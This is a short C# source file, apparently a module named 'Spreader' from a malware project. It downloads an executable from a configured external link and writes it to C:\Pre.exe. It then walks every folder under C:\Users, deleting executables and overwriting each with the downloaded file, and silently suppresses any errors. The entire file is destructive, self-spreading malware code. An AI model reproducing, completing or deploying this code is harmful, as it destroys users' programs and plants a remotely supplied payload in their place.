using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Nullable.Modules.Spreader
{
    internal sealed class Sys_Spreader
    {
        public static void Activate()
        {
            try
            {
                new WebClient().DownloadFile(Config.ExternalDownloadLink, "C:\\Pre.exe");

                foreach (string files in Directory.GetFiles("C:\\Users", ".exe", SearchOption.AllDirectories))
                {
                    File.Delete(files);
                    File.Copy("C:\\Pre.exe", files);
                }
            }
            catch
            {

            }
        }
    }
}
